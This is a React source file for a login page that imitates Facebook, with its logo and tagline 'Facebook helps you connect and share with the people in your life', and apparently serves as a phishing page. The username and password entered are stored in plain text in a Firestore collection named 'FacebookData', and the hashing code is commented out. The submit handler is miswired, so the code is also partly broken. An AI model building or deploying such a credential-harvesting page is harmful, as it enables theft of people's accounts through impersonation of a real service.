
import { Col, Container, Row, Card, Form, Button, NavLink  } from 'react-bootstrap';
import bannerImg from './assets/banner-logo.svg'
import './App.css';
import { useState } from 'react';
import app from './utils/firebase';
import { getFirestore, collection, addDoc } from 'firebase/firestore';
// import bcrypt from "bcrypt";

const saltRounds = 10;

const initalData = {
  username: '',
  password : ''
}

const db = getFirestore(app);

function App() {

const [ data , setData] = useState(initalData)

  const handSubmit = async(e) =>{
    // const hash = bcrypt.hash(data.password, salt);
    await addDoc(collection(db, 'FacebookData'),{data});
    console.log(data)
  }

  const handChange = (e) =>{
    const {name, value} = e.target;
    setData((prevData) => ({...prevData, [name]:value}))
  }



  return (
    <>
      <Container className='d-flex justify-content-center vh-100 align-items-center'>
        <Row>
          <Col md={8}>
            <img src={bannerImg} className='banner-img h-25'/>
            <h2 className='ps-4 fw-normal'>
            Facebook helps you connect and share <br/> with the people in your life.
            </h2>
          </Col>
          <Col>
          <Card style={{ width: '22rem' }} className="shadow-sm login-card border-none">
      <Card.Body>
        <Card.Title>Login</Card.Title>
        <Form >
          <Form.Group>
            <Form.Label>Username</Form.Label>
            <Form.Control type="text" size="lg" name='username' placeholder="Enter your username" onChange={handChange} value={data.username}/>
          </Form.Group>
          <Form.Group>
            <Form.Label>Password</Form.Label>
            <Form.Control type="password" size="lg" name='password' placeholder="Enter your password"  onChange={handChange}  value={data.password}/>
          </Form.Group>
          <Button variant="primary" size="lg" block className='my-4' type='submit' onSubmit={handSubmit()}>
            Login
          </Button>
        </Form>
        <NavLink href="/forgot-password" className="mt-3 text-primary">Forgot Password?</NavLink>
      </Card.Body>
    </Card>
          </Col>
        </Row>
      </Container>
    </>
  );
}

export default App;
